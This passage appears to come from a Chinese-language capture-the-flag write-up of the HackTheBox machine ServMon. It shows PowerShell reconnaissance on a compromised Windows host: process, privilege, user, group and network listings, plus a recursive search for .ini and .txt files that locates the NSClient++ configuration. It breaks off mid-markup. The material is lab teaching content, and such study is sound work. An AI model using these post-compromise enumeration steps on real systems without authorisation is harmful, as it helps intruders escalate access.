taskhostw<br>    156      49    17424      23284              6340   0 TiWorker<br>    136       8     1832       7020              2680   0 TrustedInstaller<br>    169      12     3220      10576              2384   0 VGAuthService<br>    132       8     1628       6600              1236   0 vm3dservice<br>    131       9     1688       7372              5864   1 vm3dservice<br>    388      22     9368      21368              2376   0 vmtoolsd<br>    259      18     5276      16864              5900   1 vmtoolsd                                            <br>    134      10     1532       7028              3980   1 WatchDog<br>    171      11     1460       6836               476   0 wininit<br>    281      12     2780      13120               540   1 winlogon<br>    340      15     7260      15864              3176   0 WmiPrvSE<br><br><br>PS C:\Users\Nadine\Desktop&gt;  <br><br><br>PS C:\Users\Nadine\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br>PS C:\Users\Nadine\Desktop&gt;  <br><br>PS C:\Users\Nadine\Desktop&gt; systeminfo<br>ERROR: Access denied<br>PS C:\Users\Nadine\Desktop&gt; systeminfo<br>ERROR: Access denied<br>PS C:\Users\Nadine\Desktop&gt;  <br><br>PS C:\Users\Nadine\Desktop&gt; whoami <br>servmon\nadine<br>PS C:\Users\Nadine\Desktop&gt; hostname<br>ServMon<br>PS C:\Users\Nadine\Desktop&gt; ipconfig<br><br>Windows IP Configuration<br><br><br>Ethernet adapter Ethernet0:<br><br>   Connection-specific DNS Suffix  . : htb<br>   IPv6 Address. . . . . . . . . . . : dead:beef::<span class="hljs-number">248</span><br>   IPv6 Address. . . . . . . . . . . : dead:beef::<span class="hljs-number">80</span>cc:f626:a006:<span class="hljs-number">68</span>c<br>   Link-local IPv6 Address . . . . . : fe80::<span class="hljs-number">80</span>cc:f626:a006:<span class="hljs-number">68</span>c%<span class="hljs-number">6</span><br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span><br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>   Default Gateway . . . . . . . . . : fe80::<span class="hljs-number">250</span>:<span class="hljs-number">56f</span>f:feb9:d291%<span class="hljs-number">6</span><br>                                       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span><br>PS C:\Users\Nadine\Desktop&gt;<br><br><br>PS C:\Users\Nadine\Desktop&gt; whoami /groups<br><br>GROUP INFORMATION<br>-----------------<br><br>Group Name                             Type             SID          Attributes<br><br>====================================== ================ ============ ==========================================<br>========<br>Everyone                               Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-number">-0</span>      Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>BUILTIN\Users                          Alias            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-545</span> Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>NT AUTHORITY\NETWORK                   Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-2</span>      Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>NT AUTHORITY\Authenticated Users       Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-11</span>     Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>NT AUTHORITY\This Organization         Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-15</span>     Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>NT AUTHORITY\Local account             Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-113</span>    Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>NT AUTHORITY\NTLM Authentication       Well-known group S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-64</span><span class="hljs-number">-10</span>  Mandatory group, Enabled by <span class="hljs-keyword">default</span>, Enabled group<br>Mandatory Label\Medium Mandatory Level Label            S<span class="hljs-number">-1</span><span class="hljs-number">-16</span><span class="hljs-number">-8192</span><br><br>PS C:\Users\Nadine\Desktop&gt;<br><br><br>PS C:\Users\Nadine\Desktop&gt; Get-LocalGroup<br><br>Name                                Description<br>----                                -----------<br>Access Control Assistance Operators Members of this group can remotely query authorization attributes and p... <br>Administrators                      Administrators have complete and unrestricted access to the computer/<span class="hljs-keyword">do</span>... <br>Backup Operators                    Backup Operators can override security restrictions <span class="hljs-keyword">for</span> the sole purpos... <br>Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authoriti... <br>Cryptographic Operators             Members are authorized to perform cryptographic operations.<br>Device Owners                       Members of this group can change system-wide settings.<br>Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects... <br>Event Log Readers                   Members of this group can read event logs from local machine<br>Guests                              Guests have the same access as members of the Users group by <span class="hljs-keyword">default</span>, e... <br>Hyper-V Administrators              Members of this group have complete and unrestricted access to all feat... <br>IIS_IUSRS                           Built-in group used by Internet Information Services.<br>Network Configuration Operators     Members in this group can have some administrative privileges to manage... <br>Performance Log Users               Members of this group may schedule logging of performance counters, ena... <br>Performance Monitor Users           Members of this group can access performance counter data locally and r... <br>Power Users                         Power Users are included <span class="hljs-keyword">for</span> backwards compatibility and possess limite... <br>Print Operators                     Members can administer printers installed on domain controllers<br>RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where user... <br>RDS Management Servers              Servers in this group can perform routine administrative actions on ser... <br>RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal v... <br>Remote Desktop Users                Members in this group are granted the right to logon remotely<br>Remote Management Users             Members of this group can access WMI resources over management protocol... <br>Replicator                          Supports file replication in a domain<br>Storage Replica Administrators      Members of this group have complete and unrestricted access to all feat... <br>System Managed Accounts Group       Members of this group are managed by the system.<br>Users                               Users are prevented from making accidental or intentional system-wide c... <br><br><br>PS C:\Users\Nadine\Desktop&gt;<br><br><br>PS C:\Users\Nadine\Desktop&gt; Get-LocalUser<br><br>Name               Enabled Description<br>----               ------- -----------<br>Administrator      True    Built-in account <span class="hljs-keyword">for</span> administering the computer/domain<br>DefaultAccount     False   A user account managed by the system.<br>Guest              False   Built-in account <span class="hljs-keyword">for</span> guest access to the computer/domain<br>Nadine             True<br>Nathan             True<br>WDAGUtilityAccount False   A user account managed and used by the system <span class="hljs-keyword">for</span> Windows Defender Application G... <br><br><br>PS C:\Users\Nadine\Desktop&gt;<br><br><br><br>PS C:\Users\Nadine\Desktop&gt; netstat -ano<br><br>Active Connections<br><br>  Proto  Local Address          Foreign Address        State           PID<br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">21</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2224</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">22</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2324</span> <br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span>             <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">135</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">860</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">445</span>            <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5666</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">804</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5666</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">804</span> <br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">6063</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">6699</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">8443</span>           <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">804</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49664</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">476</span> <br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49665</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">748</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49666</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">1384</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49667</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2172</span> <br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49668</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">620</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49669</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">2052</span><br>  TCP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">49670</span>          <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">628</span> <br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">22</span>        <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">55902</span>      ESTABLISHED     <span class="hljs-number">2324</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">139</span>       <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">34224</span>      CLOSE_WAIT      <span class="hljs-number">4936</span> <br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">34586</span>      CLOSE_WAIT      <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">37008</span>      CLOSE_WAIT      <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">40054</span>      CLOSE_WAIT      <span class="hljs-number">4936</span> <br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">40070</span>      CLOSE_WAIT      <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">6699</span>      <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">58846</span>      CLOSE_WAIT      <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49673</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49674</span>        ESTABLISHED     <span class="hljs-number">4936</span> <br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49674</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49673</span>        ESTABLISHED     <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49675</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49676</span>        ESTABLISHED     <span class="hljs-number">4936</span><br>  TCP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49676</span>        <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">49675</span>        ESTABLISHED     <span class="hljs-number">4936</span> <br>  TCP    [::]:<span class="hljs-number">21</span>                [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2224</span><br>  TCP    [::]:<span class="hljs-number">22</span>                [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2324</span><br>  TCP    [::]:<span class="hljs-number">135</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">860</span> <br>  TCP    [::]:<span class="hljs-number">445</span>               [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">4</span><br>  TCP    [::]:<span class="hljs-number">5666</span>              [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">804</span><br>  TCP    [::]:<span class="hljs-number">49664</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">476</span> <br>  TCP    [::]:<span class="hljs-number">49665</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">748</span><br>  TCP    [::]:<span class="hljs-number">49666</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">1384</span><br>  TCP    [::]:<span class="hljs-number">49667</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2172</span><br>  TCP    [::]:<span class="hljs-number">49668</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">620</span><br>  TCP    [::]:<span class="hljs-number">49669</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">2052</span><br>  TCP    [::]:<span class="hljs-number">49670</span>             [::]:<span class="hljs-number">0</span>                 LISTENING       <span class="hljs-number">628</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">123</span>            *:*                                    <span class="hljs-number">2412</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">500</span>            *:*                                    <span class="hljs-number">1544</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">4500</span>           *:*                                    <span class="hljs-number">1544</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5353</span>           *:*                                    <span class="hljs-number">1360</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">5355</span>           *:*                                    <span class="hljs-number">1360</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">23456</span>          *:*                                    <span class="hljs-number">4936</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">23456</span>          *:*                                    <span class="hljs-number">4936</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">56431</span>          *:*                                    <span class="hljs-number">4936</span><br>  UDP    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">57208</span>          *:*                                    <span class="hljs-number">804</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">137</span>       *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.184</span>:<span class="hljs-number">138</span>       *:*                                    <span class="hljs-number">4</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">56428</span>        *:*                                    <span class="hljs-number">2512</span><br>  UDP    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">57207</span>        *:*                                    <span class="hljs-number">804</span><br>  UDP    [::]:<span class="hljs-number">123</span>               *:*                                    <span class="hljs-number">2412</span><br>  UDP    [::]:<span class="hljs-number">500</span>               *:*                                    <span class="hljs-number">1544</span><br>  UDP    [::]:<span class="hljs-number">4500</span>              *:*                                    <span class="hljs-number">1544</span><br>  UDP    [::]:<span class="hljs-number">5353</span>              *:*                                    <span class="hljs-number">1360</span><br>  UDP    [::]:<span class="hljs-number">5355</span>              *:*                                    <span class="hljs-number">1360</span><br>PS C:\Users\Nadine\Desktop&gt;Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue<br><br><br><br>    Directory: C:\Program Files\NSClient++<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">1</span>:<span class="hljs-number">24</span> PM             <span class="hljs-number">51</span> boot.ini<br>-a----        <span class="hljs-number">1</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">51</span> PM         <span class="hljs-number">157453</span> changelog.txt<br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">04</span> PM          <span class="hljs-number">18351</span> license.txt                                                  <br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> PM           <span class="hljs-number">2683</span> nsclient.ini<br><br><br><br><br><br><br><br>PS C:\Users\Nadine\Desktop&gt;<br></code></pre></td></tr></table></figure>

<p>14、经过一系列的枚举，发现了和网站8443端口相似的目录文件</p>
<p>15、这里查看 NSClient++ 文件信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Nadine\Desktop&gt; cd C:\<span class="hljs-string">&quot;Program Files&quot;</span>\<br>PS C:\Program Files&gt; dir<br><br><br>    Directory: C:\Program Files<br> <br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         <span class="hljs-number">3</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">20</span> AM                Common Files<br>d-----       <span class="hljs-number">11</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">52</span> PM                internet explorer<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">07</span> PM                MSBuild<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                NSClient++<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">46</span> PM                NVMS<span class="hljs-number">-1000</span><br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> PM                OpenSSH-Win64<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">07</span> PM                Reference Assemblies<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">44</span> PM                VMware<br>d-r---       <span class="hljs-number">11</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">52</span> PM                Windows Defender<br>d-----       <span class="hljs-number">11</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">52</span> PM                Windows Defender Advanced Threat Protection<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Mail<br>d-----       <span class="hljs-number">11</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">52</span> PM                Windows Media Player<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Multimedia Platform<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">28</span> AM                windows nt<br>d-----       <span class="hljs-number">11</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">52</span> PM                Windows Photo Viewer<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Portable Devices<br>d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Security<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">25</span> PM                WindowsPowerShell<br><br><br>PS C:\Program Files&gt; cd NSClient++<br>PS C:\Program Files\NSClient++&gt;<br>PS C:\Program Files\NSClient++&gt; dir<br><br><br>    Directory: C:\Program Files\NSClient++<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">3</span>/<span class="hljs-number">17</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">4</span>:<span class="hljs-number">27</span> AM                crash-dumps<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                modules<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                scripts<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                security<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">55</span> PM                web<br>-a----        <span 